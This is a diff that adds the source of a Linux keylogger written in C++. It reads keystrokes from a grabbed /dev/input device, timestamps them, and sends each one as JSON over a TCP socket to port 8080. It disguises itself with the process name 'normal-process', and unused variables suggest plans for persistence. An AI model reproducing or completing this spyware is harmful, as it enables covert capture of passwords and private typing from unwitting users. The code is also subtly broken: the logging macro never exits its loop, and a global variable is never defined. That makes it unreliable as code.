@@ -1,0 +1,631 @@
+// eventstruct.h
+
+#ifndef eventstruct_h
+#define eventstruct_h
+
+#include <string>
+
+struct event {
+	std::string date; // YYYY-MM-DD
+	std::string time; // HH:MM:SS
+	std::string key;
+	bool        press;
+};
+
+#endif // eventstruct_h
+// logger.h
+
+#ifndef logger_h
+#define logger_h
+
+#include "messages.h"
+#include "eventstruct.h"
+#include "tsq.h"
+#include <linux/input.h>
+#include <unordered_map>
+
+#include <atomic>
+#include <iostream>
+#include <string>
+#include <thread>
+
+class logger {
+public:
+	static logger& get_instance(tsq& queue);
+
+	logger(logger const&)            = delete;
+	logger& operator=(logger const&) = delete;
+
+	auto init(std::string const& event_ID = "") -> bool;
+	auto check_init() const -> bool;
+
+	auto start() -> void;
+	auto kill() -> void;
+
+private:
+	logger(tsq& queue);
+	~logger();
+
+	int                                                                         fd_;
+	bool                                                                        initialized_;
+	std::atomic<bool>                                                           running_;
+	std::string                                                                 ev_init_;
+	const std::unordered_map<unsigned int, std::pair<std::string, std::string>> keymap_;
+	tsq&                                                                        q_;
+	std::thread                                                                 work_;
+
+	static auto
+	     load_keymap(const std::string& config) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>>;
+	auto fd_monitor(signed int fd, fd_set& fds) -> signed int;
+	auto datetime(time_t tv_sec) -> std::pair<std::string, std::string>;
+
+	auto find_kbd() -> std::string;
+	auto ev_reader() -> void;
+	auto get_keychar(unsigned int code) -> std::string;
+};
+
+#endif // logger_h
+// logger.cpp
+
+#include "logger.h"
+
+#include <linux/input-event-codes.h>
+#include <nlohmann/json.hpp>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#include <array>
+#include <cassert>
+#include <cstring>
+#include <ctime>
+#include <fcntl.h>
+#include <filesystem>
+#include <fstream>
+#include <unistd.h>
+#include <utility>
+
+logger& logger::get_instance(tsq& queue) {
+    static logger instance(queue);
+    return instance;
+}
+
+logger::logger(tsq& queue)
+    : fd_(-1)
+    , initialized_(false)
+    , running_(false)
+    , keymap_(load_keymap("keymap.json"))
+    , q_(queue) {}
+
+logger::~logger() {
+    kill();
+}
+
+auto logger::init(const std::string& event_ID) -> bool {
+    if (check_init()) {
+        LOG(messagetype::error, "logger (init): logger already initialized.");
+        return false;
+    }
+
+    auto const device = event_ID.empty() ? find_kbd() : event_ID;
+    if (device.empty()) {
+        LOG(messagetype::error, "logger (init): no viable keyboard device found.");
+        return false;
+    }
+
+    fd_ = open(device.c_str(), O_RDONLY | O_NONBLOCK);
+    if (fd_ == -1) {
+        LOG(messagetype::error, "logger (init): failed to open device.");
+        return false;
+    }
+
+    initialized_ = true;
+    ev_init_     = device;
+
+    if (ioctl(fd_, EVIOCGRAB, 1) == -1) {
+        LOG(messagetype::warning, "logger (init): failed to grab the device.");
+    } else {
+        LOG(messagetype::debug, "logger (init): device grabbed successfully.");
+    }
+    LOG(messagetype::info, "logger (init): initialized");
+    return true;
+}
+
+auto logger::check_init() const -> bool { return initialized_; }
+
+auto logger::start() -> void {
+    if (!check_init()) {
+        LOG(messagetype::error, "logger (start): logger not initialized.");
+        return;
+    }
+    if (running_) {
+        LOG(messagetype::warning, "logger (start): logger already running.");
+        return;
+    }
+
+    running_ = true;
+
+    if (work_.joinable()) {
+        LOG(messagetype::debug, "logger (start): joining worker thread.");
+        work_.join();
+    }
+
+    work_ = std::thread(&logger::ev_reader, this);
+    LOG(messagetype::info, "logger (start): logger processing thread started.");
+}
+
+auto logger::kill() -> void {
+    running_ = false;
+    if (fd_ != -1) {
+        close(fd_);
+        fd_ = -1;
+    }
+    if (work_.joinable()) {
+        work_.join();
+    }
+    initialized_ = false;
+    ev_init_.clear();
+    LOG(messagetype::debug, "logger (kill): sender killed.");
+
+}
+
+auto logger::load_keymap(const std::string& config)
+    -> std::unordered_map<unsigned int, std::pair<std::string, std::string>> {
+    auto tmp  = std::unordered_map<unsigned int, std::pair<std::string, std::string>>{};
+    auto conf = std::ifstream(config);
+
+    if (!conf.is_open()) {
+        LOG(messagetype::error, "logger (load_keymap): keymap config error.");
+        return tmp;
+    }
+
+    auto keyconfig = nlohmann::json{};
+    conf >> keyconfig;
+
+    for (auto& [key, val] : keyconfig.items()) {
+        auto code = std::stoi(key);
+        auto name = std::string{val[0]};
+        auto ch   = std::string{val[1]};
+        tmp.emplace(code, std::make_pair(name, ch));
+    }
+
+    return tmp;
+}
+
+auto logger::fd_monitor(signed int fd, fd_set& fds) -> signed int {
+    struct timeval timeout {
+        1, 0
+    };
+
+    FD_ZERO(&fds);
+    FD_SET(fd, &fds);
+
+    auto const retval = select(fd + 1, &fds, nullptr, nullptr, &timeout);
+    if (retval == -1) {
+        LOG(messagetype::error, "logger (fd_monitor): select error.");
+    }
+
+    return retval;
+}
+
+auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
+    auto date = std::array<char, 11>{};
+    auto time = std::array<char, 9>{};
+
+    std::tm* tv = std::localtime(&tv_sec);
+    std::strftime(date.data(), date.size(), "%Y-%m-%d", tv);
+    std::strftime(time.data(), time.size(), "%H:%M:%S", tv);
+
+    return std::make_pair(std::string{date.data()}, std::string{time.data()});
+}
+
+auto logger::find_kbd() -> std::string {
+    auto const dev_input = "/dev/input";
+    if (!std::filesystem::exists(dev_input)) {
+        LOG(messagetype::error, "logger (find_kbd): /dev/input directory not found.");
+        return "";
+    }
+    if (!std::filesystem::is_directory(dev_input)) {
+        LOG(messagetype::error, "logger (find_kbd): /dev/input is not a directory.");
+        return "";
+    }
+
+    for (const auto& event_num : std::filesystem::directory_iterator(dev_input)) {
+        auto const& path = event_num.path();
+        if (path.filename().string().find("event") == 0) {
+            auto const resolved_path = path.string();
+            LOG(messagetype::debug, "logger (find_kbd): attempting device " + resolved_path);
+
+            auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
+            if (fd == -1) {
+                LOG(messagetype::debug, "logger (find_kbd): fd = -1");
+                continue;
+            }
+
+            // Optionally, you can check if the device is a keyboard
+            // Here, we assume the first responsive event device is acceptable
+
+            fd_set fds;
+            FD_ZERO(&fds);
+            auto retval = fd_monitor(fd, fds);
+            if (retval > 0 && FD_ISSET(fd, &fds)) {
+                close(fd);
+                LOG(messagetype::info, "logger (find_kbd): found working input device at " + resolved_path);
+                return resolved_path;
+            }
+            LOG(messagetype::debug, "logger (find_kbd): device did not respond as expected: " + resolved_path);
+            close(fd);
+        }
+    }
+    LOG(messagetype::error, "logger (find_kbd): no viable keyboard device found.");
+    return "";
+}
+
+auto logger::ev_reader() -> void {
+    LOG(messagetype::info, "logger (ev_reader): ev_reader loop started.");
+    auto ev = input_event{};
+    while (running_) {
+        fd_set fds;
+        auto   retval = fd_monitor(fd_, fds);
+        if (retval == -1) {
+            LOG(messagetype::error, "logger (ev_reader): select error.");
+            break;
+        }
+
+        if (retval > 0 && FD_ISSET(fd_, &fds)) {
+            auto n = read(fd_, &ev, sizeof(ev));
+
+            if (n == -1) {
+                if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    continue;
+                } else {
+                    LOG(messagetype::error, "logger (ev_reader): read error.");
+                    break;
+                }
+            }
+            LOG(messagetype::debug, "logger (ev_reader): read " + std::to_string(n) +
+                                 " bytes, ev.type = " + std::to_string(ev.type) +
+                                 ", ev.code = " + std::to_string(ev.code) +
+                                 ", ev.value = " + std::to_string(ev.value));
+
+            if (n == static_cast<ssize_t>(sizeof(ev)) && ev.type == EV_KEY) {
+                auto dtg = datetime(ev.time.tv_sec);
+                auto key_char = get_keychar(ev.code);
+                event e{dtg.first, dtg.second, key_char, ev.value ? true : false};
+                if (ev.value == true) {
+                    LOG(messagetype::debug, "logger (ev_reader): pushing event to queue: key = " + e.key);
+                    q_.push(e);
+                }
+            }
+        }
+    }
+    LOG(messagetype::info, "logger (ev_reader): ev_reader loop terminated.");
+}
+
+auto logger::get_keychar(unsigned int code) -> std::string {
+    auto it = keymap_.find(code);
+    if (it == keymap_.end()) {
+        LOG(messagetype::warning, "logger (get_keychar): unknown key code: " + std::to_string(code));
+        return "<unknown>";
+    }
+    return it->second.second;
+}
+
+// sender.h
+
+#ifndef sender_h
+#define sender_h
+
+#include "messages.h"
+#include "eventstruct.h"
+#include "tsq.h"
+#include <nlohmann/json.hpp>
+
+#include <atomic>
+#include <thread>
+
+class sender {
+public:
+	static sender& get_instance(tsq& queue);
+
+	sender(sender const&)            = delete;
+	sender& operator=(sender const&) = delete;
+
+	auto init(std::string const& event_ID = "") -> bool;
+	auto check_init() const -> bool;
+
+	auto start() -> void;
+	auto kill() -> void;
+
+private:
+	sender(tsq& queue);
+	~sender();
+
+	auto ev_to_json(const event& e) -> nlohmann::json;
+	auto push_jsonev(nlohmann::json json) -> void;
+	auto process() -> void;
+
+	int               fd_;
+	bool              initialized_;
+	std::atomic<bool> running_;
+	std::string       ev_init_;
+	tsq&              q_;
+	std::thread       work_;
+};
+
+#endif // sender_h
+// sender.cpp
+
+#include "sender.h"
+
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
+#include <iostream>
+#include <string>
+#include <thread>
+#include <unistd.h>
+
+
+sender& sender::get_instance(tsq& queue) {
+    static sender instance(queue);
+    return instance;
+}
+
+sender::sender(tsq& queue)
+    : fd_(-1)
+    , initialized_(false)
+    , running_(false)
+    , q_(queue) {}
+
+sender::~sender() {
+    kill();
+    if (fd_ != -1) {
+        close(fd_);
+    }
+    q_.shutdown();
+    if (work_.joinable()) {
+        work_.join();
+    }
+}
+
+auto sender::init(std::string const& event_ID) -> bool {
+    if (check_init()) {
+        LOG(messagetype::error, "sender (init): sender already initialized.");
+        return false;
+    }
+    fd_ = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd_ == -1) {
+        LOG(messagetype::error, "sender (init): failed to create socket.");
+        return false;
+    }
+    initialized_ = true;
+    ev_init_     = fd_;
+    LOG(messagetype::info, "sender (init): sender initialized.");
+
+    return true;
+}
+
+auto sender::check_init() const -> bool { return initialized_; }
+
+auto sender::start() -> void {
+    if (!check_init()) {
+        LOG(messagetype::error, "sender (start): not initialized.");
+        return;
+    }
+    if (running_) {
+        LOG(messagetype::warning, "sender (start): already running.");
+        return;
+    }
+
+    running_ = true;
+
+    if (work_.joinable()) {
+        LOG(messagetype::debug, "sender (start): joining worker thread.");
+        work_.join();
+    }
+
+    work_ = std::thread(&sender::process, this);
+    LOG(messagetype::info, "sender (start): sender processing thread started.");
+}
+
+auto sender::kill() -> void {
+    running_ = false;
+    if (work_.joinable()) {
+        work_.join();
+    }
+    initialized_ = false;
+    ev_init_.clear();
+    LOG(messagetype::debug, "sender (kill): sender killed.");
+}
+
+auto sender::ev_to_json(const event& e) -> nlohmann::json {
+    nlohmann::json json;
+    json["date"] = e.date; // YYYY-MM-DD
+    json["time"] = e.time; // HH:MM:SS
+    json["key"]  = e.key;
+    return json;
+}
+
+auto sender::push_jsonev(nlohmann::json json) -> void {
+    if (!check_init()) {
+        LOG(messagetype::error, "sender (push_jsonev): not initialized.");
+        return;
+    }
+
+    auto packet = json.dump();
+    auto fd     = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in srvaddr{};
+    srvaddr.sin_family = AF_INET;
+    srvaddr.sin_port   = htons(8080);
+    fd_                = fd;
+
+    if (fd == -1) {
+        LOG(messagetype::error, "sender (push_jsonev): socket open error.");
+        return;
+    }
+
+    auto addr = inet_pton(AF_INET, "127.0.0.1", &srvaddr.sin_addr);
+    if (addr <= 0) {
+        LOG(messagetype::error, "sender (push_jsonev): invalid address.");
+        close(fd);
+        return;
+    }
+
+    auto conn = connect(fd, (sockaddr*)&srvaddr, sizeof(srvaddr));
+    if (conn == -1) {
+        LOG(messagetype::error, "sender (push_jsonev): connection error: " + std::string(strerror(errno)));
+        close(fd);
+        return;
+    }
+
+    auto sent = send(fd, packet.c_str(), packet.size(), 0);
+    if (sent == -1) {
+        LOG(messagetype::error, "sender (push_jsonev): send error: " + std::string(strerror(errno)));
+    } else {
+        LOG(messagetype::info, "sender (push_jsonev): successfully sent JSON packet.");
+    }
+    close(fd);
+}
+
+auto sender::process() -> void {
+    if (!running_) {
+        LOG(messagetype::error, "sender (process): sender not running.");
+        return;
+    }
+    if (!check_init()) {
+        LOG(messagetype::error, "sender (process): sender not initialized.");
+        return;
+    }
+    LOG(messagetype::info, "sender (process): starting process loop.");
+
+    while (running_) {
+        LOG(messagetype::debug, "sender (process): waiting for event.");
+        event e = q_.pop();
+        LOG(messagetype::debug, "sender (process): event popped from queue.");
+        auto json = ev_to_json(e);
+        push_jsonev(json);
+        LOG(messagetype::debug, "sender (process): event sent");
+    }
+    LOG(messagetype::info, "sender (process): process loop terminated.");
+}
+
+// main.cpp
+
+#include "tsq.h"
+#include "messages.h"
+#include "logger.h"
+#include "sender.h"
+#include <sys/prctl.h>
+
+#include <cstring>
+
+int main() {
+	auto usrgrp = true;
+	auto crnjob = true;
+
+    messages = messagetype::debug;
+
+    char const* pr_name = "normal-process";
+    prctl(PR_SET_NAME, pr_name, 0, 0, 0);
+
+    tsq queue;
+
+    logger& logger = logger::get_instance(queue);
+    sender& sender = sender::get_instance(queue);
+
+    if (!logger.init("")) {
+        return -1;
+    }
+
+    if (!sender.init("")) {
+        return -1;
+    }
+
+    logger.start();
+    sender.start();
+
+    while (true) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+	return 0;
+}
+//  messages.h
+
+#ifndef messages_h
+#define messages_h
+
+#include <iostream>
+#include <string>
+
+enum class messagetype {
+	none,
+	error,
+	warning,
+	info,
+	debug
+};
+
+extern messagetype messages;
+
+#define LOG(level, message) \
+	do { \
+		if (level <= messages) { \
+			std::cerr << message << std::endl; \
+		} \
+	} while (true)
+
+#endif // messages_h
+
+
+// tsq.h
+// https://www.geeksforgeeks.org/implement-thread-safe-queue-in-c/ <- 100% stolen from here.
+
+#ifndef tsq_h
+#define tsq_h
+
+#include "eventstruct.h"
+#include <condition_variable>
+
+#include <iostream>
+#include <mutex>
+#include <queue>
+
+class tsq {
+public:
+	auto push(const event item) -> void {
+		std::unique_lock<std::mutex> lock(mutex_);
+		queue_.push(item);
+		condition_.notify_one();
+	}
+
+	auto pop() -> event {
+		std::unique_lock<std::mutex> lock(mutex_);
+		condition_.wait(lock, [this]() { return !queue_.empty(); });
+		event item = queue_.front();
+		queue_.pop();
+
+		return item;
+	}
+
+	auto empty() -> bool {
+		std::lock_guard<std::mutex> lock(mutex_);
+		return queue_.empty();
+	}
+
+	auto size() -> size_t {
+		std::lock_guard<std::mutex> lock(mutex_);
+		return queue_.size();
+	}
+
+	void shutdown() {
+		std::lock_guard<std::mutex> lock(mutex_);
+		condition_.notify_all();
+	}
+
+private:
+	std::queue<event>       queue_;
+	std::mutex              mutex_;
+	std::condition_variable condition_;
+};
+
+#endif // tsq_h
